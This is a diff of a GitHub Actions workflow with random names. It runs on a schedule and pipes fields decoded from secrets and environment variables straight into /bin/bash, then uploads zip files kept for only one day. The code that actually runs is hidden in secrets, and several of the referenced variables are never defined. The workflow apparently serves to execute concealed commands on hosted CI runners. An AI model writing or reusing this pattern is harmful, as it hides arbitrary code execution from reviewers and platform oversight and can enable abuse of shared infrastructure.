@@ -1,23 +1,26 @@
 name: rengongchangjie
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '3 3/6 * * *'
 
-jobs:  # 2915
+  schedule:
+    - cron: '10 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: rengongchangjie
         env:
-          xiou75523: ${{ secrets.xiou75523 }}
+          zuoua6505: ${{ secrets.zuoua6505 }}
         run: |
-          echo $xiou75523 | jq -r .fz7886 | /bin/bash
-          echo $e0 | jq -r .dtxp103 | /bin/bash
-          echo $kdno39288 | jq -r .cc041 | /bin/bash
-          echo $j96308 | jq -r .hqlsp07707 | /bin/bash
-          echo $vfr1 | jq -r .xihoi99 | /bin/bash
-          echo $fmv530 | jq -r .eay281 | /bin/bash
-          echo $kygbv46782 | jq -r .hhvt461 | /bin/bash
+          printf '%s' "$zuoua6505" | jq -r .ve6643 | /bin/bash
+          printf '%s' "$r4" | jq -r .sext69053 | /bin/bash
+          echo $mbc5 | jq -r .cqj17871 | /bin/bash
+          printf '%s' "$xhxlj737" | jq -r .h6924 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: tbCdVmB8
+          path: "*.zip"
+          retention-days: 1
